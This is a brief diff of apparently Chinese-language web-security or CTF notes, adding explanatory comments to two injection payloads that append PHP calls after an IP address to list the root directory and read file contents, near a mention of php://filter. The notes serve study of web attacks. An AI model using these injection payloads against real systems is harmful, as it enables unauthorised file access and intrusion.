@@ -32,8 +32,8 @@ php://filter //通过一些过滤将原数据进行一些操作后下载
 HTML注入：
 
 ```
-127.0.0.1;var_dump(scandir('/'));
-127.0.0.1;file_get_contents(filename);
+127.0.0.1;var_dump(scandir('/'));   //显示根目录下文件列表
+127.0.0.1;file_get_contents(filename);  //获取文件内容
 ```
 
 * #### Bypass
